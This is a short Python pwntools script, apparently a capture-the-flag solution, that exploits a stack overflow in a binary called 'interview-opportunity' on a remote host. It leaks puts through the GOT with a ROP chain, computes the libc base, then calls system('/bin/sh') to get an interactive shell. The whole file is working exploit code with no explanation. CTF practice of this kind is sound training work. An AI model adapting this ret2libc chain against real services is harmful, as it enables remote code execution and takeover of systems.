from pwn import *

BEDUG = False

elf = ELF('./interview-opportunity')

if BEDUG==True:
    io = process('./interview-opportunity', env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF('./libc.so.6')
else:
    io = remote('mc.ax', 31081)
    libc = ELF('./libc.so.6')

def pad(payload):
    new = payload + b'A'*(66 - len(payload))
    return new

io.recv()
payload = b'A'*34+p64(0x0000000000401313) # pop rdi ; ret
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(0x401240)
io.send(payload)
io.recvuntil(b'@\n')
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['puts']
log.info('LIBC: '+hex(libc.address))
io.recv()
payload = b'A'*34+p64(0x0000000000401313)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
io.send(payload)
io.interactive()
